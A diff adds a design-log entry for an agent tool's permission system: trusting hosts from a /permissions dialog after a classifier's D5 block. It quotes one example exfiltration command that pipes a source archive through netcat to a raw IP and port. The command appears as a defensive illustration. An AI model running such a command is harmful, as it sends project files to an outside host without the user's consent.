@@ -14428,3 +14428,57 @@ changes by the entry ("No stored form ... changes" on each runtime and
 mob item; the new roster field is `#[serde(skip)]`), and the stored-state
 guard opens `tests/fixtures/state-0.0.1/` unchanged. No test was
 re-pinned to new engine behaviour; one assertion was added.
+
+## Trusting a host from `/permissions` (owner, 2026-11-23)
+
+The owner asked for a way to add and remove `[auto] trusted_hosts`
+without editing the file, and for a D5 block to say how to trust its
+host. First brief: a `/hosts` command opening `/permissions` on a new
+section, with typed `add`/`remove` forms. Changed by the owner before it
+was built: no separate command and no typed forms; the hosts live only
+in `/permissions`, as a third section (Hosts), opened by Tab or by
+`/permissions hosts` (the existing pattern of `/permissions
+blocked|rules`).
+
+Where the host comes from. The classifier's verdict already carries the
+block rule as a structured field (stage 2's `RULE:` line,
+`prompts::parse_stage2`), so "this is a D5 block" needs no prose
+(`hosts::is_host_rule`, the id's first word, any case). The host itself
+is never taken from the classifier's reason: it is read from the call's
+own arguments by the deterministic reader that already wrote the hint
+(`hosts::hosts_in`: URLs, scp-like remotes, `--hostname`), minus the
+project's own and the trusted ones. Under D5 those hosts are kept on the
+Blocked entry (`BlockedCall::hosts`, an in-memory wire field with a
+serde default) and `t`/`T` trust exactly them. A D5 block whose call
+names no host the reader finds (`tar c src | nc 203.0.113.9 4444`) gets
+the general hint and no `t`; one whose hosts are all trusted already (a
+secret, D5 at any host) gets no host hint. No prompt and no verdict
+shape changed, so the corpus's labels and its deterministic evaluation
+are untouched (no live corpus run was needed; none was made).
+
+Origins. A trusted host now carries every layer that names it
+(`hosts::TrustedHost`, `config::lasting`): the Hosts section shows them,
+and removal takes the host out of every file of the user's that names it
+(matched by its normalized pattern, `SettingsFile::remove_matching`, so
+`GitLab.Example.com.` goes for `gitlab.example.com`); one the daemon's
+command line names stays until the daemon stops and the answer says so.
+`tui.toml`'s format is unchanged (a list of strings), so files of earlier
+builds open as they did.
+
+Writes go through `SettingsFile::add_to_list` and `remove_matching`
+under the engine's `PermissionFiles::writing` hold, as statements do,
+and the engine's held list changes with the write, so the next review is
+told at once and the files' follow (`replace_lasting`) finds nothing to
+tell. Nothing the agent can call reaches `rkat/trust_host` or
+`rkat/untrust_host`: they are client methods (the attach handshake's),
+like every `/permissions` act, and a client attached by
+`--attach=HOST:PORT` uses them as it uses the other permission acts (the
+files written are the daemon's host's).
+
+Pinned by `trusted_hosts::a_host_trusted_in_the_dialog_is_written_live_and_survives_a_restart`,
+`trusted_hosts::a_d5_block_says_how_to_trust_its_host_and_t_trusts_it`,
+`ui::tests::permissions::the_hosts_section_lists_trusted_and_project_hosts_and_removes_one`,
+`ui::tests::permissions::the_hosts_field_checks_the_entry_and_chooses_the_file`,
+`ui::tests::permissions::a_d5_block_s_hosts_are_trusted_with_one_key`,
+`approval::hosts::tests::the_host_rule_is_recognized_by_its_id`,
+`config::write::tests::list_entries_are_removed_by_a_match`.
